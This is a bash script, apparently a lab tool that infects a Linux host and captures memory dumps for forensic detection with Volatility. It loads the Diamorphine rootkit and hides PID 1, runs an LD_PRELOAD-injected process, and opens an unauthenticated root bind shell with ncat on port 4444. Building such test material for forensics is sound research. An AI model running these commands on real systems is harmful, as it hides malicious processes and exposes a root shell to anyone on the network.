#!/usr/bin/env bash
# manage_infect – Infection & memory capture manager (rootkit+injection pre-built)
set -e

ROOTKIT_MODULE="diamorphine"
BACKDOOR_PORT=4444
SLEEP_PID_FILE="/tmp/sleep_infected.pid"
TAIL_PID_FILE="/tmp/injection_tail.pid"
INJECTION_MARKER="/tmp/injection_marker"

FLAG_ROOTKIT="/tmp/.rootkit_active"
FLAG_INJECTION="/tmp/.injection_active"
FLAG_BACKDOOR="/tmp/.backdoor_active"

AVML_PATH="/tmp/avml"
AVML_URL="https://github.com/microsoft/avml/releases/download/v0.14.0/avml"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
MODULE_PATH="$SCRIPT_DIR/assets/diamorphine.ko"
INJECT_LIB="$SCRIPT_DIR/assets/evil.so"

# --- Helpers ---
is_module_active() {
    [ -d "/sys/module/${ROOTKIT_MODULE}" ]
}

install_rootkit() {
    if [ -f "$FLAG_ROOTKIT" ]; then
        echo "[*] Rootkit already installed (flag)."
        return 0
    fi
    if is_module_active; then
        echo "[*] Rootkit appears to be already loaded (detected via /sys)."
        touch "$FLAG_ROOTKIT"
        return 0
    fi

    if [ ! -f "$MODULE_PATH" ]; then
        echo "[!] Pre-built rootkit module not found at $MODULE_PATH"
        echo "[!] Build it with: cd tools/diamorphine && make"
        exit 1
    fi

    sudo insmod "$MODULE_PATH"
    sudo kill -31 1   # hide PID 1
    touch "$FLAG_ROOTKIT"
    echo "[+] Rootkit loaded (pre-built)."
}

install_injection() {
    if [ -f "$FLAG_INJECTION" ]; then
        echo "[*] Code injection already active."
        return 0
    fi

    if [ ! -f "$INJECT_LIB" ]; then
        echo "[!] Pre-built library missing from assets/evil.so"
        echo "[!] Build it first with: gcc -shared -fPIC evil.c -o assets/evil.so"
        exit 1
    fi

    # ------------------------------------------------------------------ #
    # NEW INJECTION DETECTION STRATEGY: lsof marker                       #
    #                                                                      #
    # Problem: the old approach (detect "sleep 9999" in pslist, or find   #
    # evil.so via linux.elfs/Maps) fails because:                         #
    #   a) When the rootkit is also active, Diamorphine hides the sleep   #
    #      process from /proc, so pslist misses it.                       #
    #   b) After dlopen/LD_PRELOAD the library file may be mapped         #
    #      anonymously, making library-list plugins blind to it.          #
    #                                                                      #
    # New approach: create a uniquely-named file and keep it open via a   #
    # dedicated "tail -f" process. Volatility's linux.lsof.Lsof walks     #
    #   task_struct → files → fdtable → file → dentry → d_name            #
    # directly from kernel memory (not /proc), so it finds the open fd    #
    # even if the process is hidden from /proc by the rootkit.            #
    # AVML captures all kernel memory, so the dentry/inode for the open   #
    # file survives the memory acquisition step.                           #
    # ------------------------------------------------------------------ #

    # 1. Create the unique marker file with a recognisable magic string
    echo "INJECTION_MARKER_RAMble" > "$INJECTION_MARKER"

    # 2. Launch the LD_PRELOAD-injected process (unchanged behaviour)
    LD_PRELOAD="$INJECT_LIB" /usr/bin/sleep 9999 &
    local sleep_pid=$!
    sleep 1
    echo "$sleep_pid" > "$SLEEP_PID_FILE"
    echo "[+] Code injected (LD_PRELOAD) into PID $sleep_pid"

    # 3. Launch a sentinel process whose only job is keeping the marker
    #    file open so linux.lsof.Lsof can see it in the memory dump.
    tail -f "$INJECTION_MARKER" >/dev/null 2>&1 &
    local tail_pid=$!
    echo "$tail_pid" > "$TAIL_PID_FILE"
    echo "[+] Marker sentinel PID $tail_pid holding $INJECTION_MARKER open"

    touch "$FLAG_INJECTION"
    echo "[+] Injection active. Volatility linux.lsof.Lsof will see '$INJECTION_MARKER'."
}

install_backdoor() {
    if [ -f "$FLAG_BACKDOOR" ]; then
        echo "[*] Backdoor already active."
        return 0
    fi
    sudo apt install -y ncat 2>/dev/null
    sudo ncat -l -k -p $BACKDOOR_PORT -e /bin/bash &
    touch "$FLAG_BACKDOOR"
    echo "[+] Bind shell on port $BACKDOOR_PORT"
}

clean_rootkit() {
    # Try normal removal, then force
    sudo rmmod "$ROOTKIT_MODULE" 2>/dev/null || \
    [ -d "/sys/module/${ROOTKIT_MODULE}" ] && sudo rmmod --force "$ROOTKIT_MODULE" 2>/dev/null || true

    if [ -d "/sys/module/${ROOTKIT_MODULE}" ]; then
        echo "[!] Rootkit module could not be removed – a reboot may be required."
    else
        echo "[+] Rootkit removed."
    fi
    rm -f "$FLAG_ROOTKIT"
}

clean_injection() {
    # Kill the LD_PRELOAD-injected sleep process
    if [ -f "$SLEEP_PID_FILE" ]; then
        local pid
        pid=$(cat "$SLEEP_PID_FILE")
        if ps -p "$pid" > /dev/null 2>&1; then
            sudo kill "$pid" 2>/dev/null || true
        fi
        rm -f "$SLEEP_PID_FILE"
    fi

    # Kill the marker sentinel process
    if [ -f "$TAIL_PID_FILE" ]; then
        local tail_pid
        tail_pid=$(cat "$TAIL_PID_FILE")
        if ps -p "$tail_pid" > /dev/null 2>&1; then
            kill "$tail_pid" 2>/dev/null || true
        fi
        rm -f "$TAIL_PID_FILE"
    fi

    # Remove the marker file
    rm -f "$INJECTION_MARKER"
    rm -f "$FLAG_INJECTION"
    echo "[+] Injection cleaned."
}

clean_backdoor() {
    local pid
    pid=$(pgrep -f "ncat.*-l.*-p ${BACKDOOR_PORT}" 2>/dev/null || true)
    [ -n "$pid" ] && sudo kill "$pid" 2>/dev/null || true
    rm -f "$FLAG_BACKDOOR"
    echo "[+] Backdoor cleaned."
}

parse_components() {
    local input="$1"
    [ "$input" = "all" ] && echo "rootkit injection backdoor" || echo "${input//,/ }"
}

active_components() {
    local comps=()
    [ -f "$FLAG_ROOTKIT" ]    && comps+=("rootkit")
    [ -f "$FLAG_INJECTION" ]  && comps+=("injection")
    [ -f "$FLAG_BACKDOOR" ]   && comps+=("backdoor")
    [ ${#comps[@]} -eq 0 ]    && comps+=("clean")
    echo "${comps[@]}"
}

ensure_avml() {
    if [ -f "$AVML_PATH" ]; then return 0; fi
    echo "[*] Downloading AVML..."
    wget -q "$AVML_URL" -O "$AVML_PATH"
    chmod +x "$AVML_PATH"
    echo "[+] AVML ready at $AVML_PATH"
}

capture_memory() {
    local out_dir="$1"
    ensure_avml
    local timestamp
    timestamp=$(date +%Y%m%d_%H%M%S)
    local comps=( $(active_components) )
    local IFS=_
    local name="memdump_${timestamp}_${comps[*]}.raw"
    local full_path="${out_dir}/${name}"
    mkdir -p "$out_dir"
    echo "[*] Capturing memory to $full_path ..."
    sudo "$AVML_PATH" --compress "$full_path"
    echo "[+] Memory dump saved: $full_path"
}

show_status() {
    local comps=( $(active_components) )
    if [ "${comps[0]}" = "clean" ]; then
        echo "[+] Machine is clean."
    else
        echo "[!] Active malware components: ${comps[*]}"
    fi
}

# --- Main ---
USAGE="Usage: $0 [-i [components] | -c [components] | -s] [-a [output_dir]]
  -i        Infect (components: rootkit,injection,backdoor | 'all' default)
  -c        Clean  (components as above)
  -s        Status
  -a        Capture memory with AVML, optionally specify output directory (default: current)
Examples:
  $0 -i rootkit -a /tmp/dumps
  $0 -i -a       (infect all, dump in current dir)
  $0 -c injection
  $0 -c          (clean all)"

ACTION=""
CAPTURE=false
COMPONENTS="all"
OUTPUT_DIR="."

while getopts "icsa" opt; do
    case $opt in
        i) ACTION="infect";;
        c) ACTION="clean";;
        s) ACTION="status";;
        a) CAPTURE=true
           # If next argument exists and doesn't start with '-', use it as output dir
           if [ -n "${!OPTIND}" ] && [[ "${!OPTIND}" != -* ]]; then
               OUTPUT_DIR="${!OPTIND}"
               OPTIND=$((OPTIND+1))
           fi
           ;;
        *) echo "$USAGE"; exit 1;;
    esac
done

shift $((OPTIND-1))

# Remaining arguments: if action is infect/clean and a non-option argument exists, treat as components
if [ "$ACTION" = "infect" ] || [ "$ACTION" = "clean" ]; then
    if [ $# -gt 0 ] && [[ "$1" != -* ]]; then
        COMPONENTS="$1"
        shift
    fi
fi

if [ -z "$ACTION" ]; then
    echo "$USAGE"
    exit 1
fi

COMP_LIST=$(parse_components "$COMPONENTS")

if [ "$ACTION" = "status" ]; then
    show_status
elif [ "$ACTION" = "infect" ]; then
    for comp in $COMP_LIST; do
        case $comp in
            rootkit)   install_rootkit;;
            injection) install_injection;;
            backdoor)  install_backdoor;;
            *) echo "Unknown component: $comp"; exit 1;;
        esac
    done
    echo "[+] Infection complete."
elif [ "$ACTION" = "clean" ]; then
    for comp in $COMP_LIST; do
        case $comp in
            rootkit)   clean_rootkit;;
            injection) clean_injection;;
            backdoor)  clean_backdoor;;
            *) echo "Unknown component: $comp"; exit 1;;
        esac
    done
    echo "[+] Cleanup complete."
fi

if $CAPTURE; then
    capture_memory "$OUTPUT_DIR"
fi
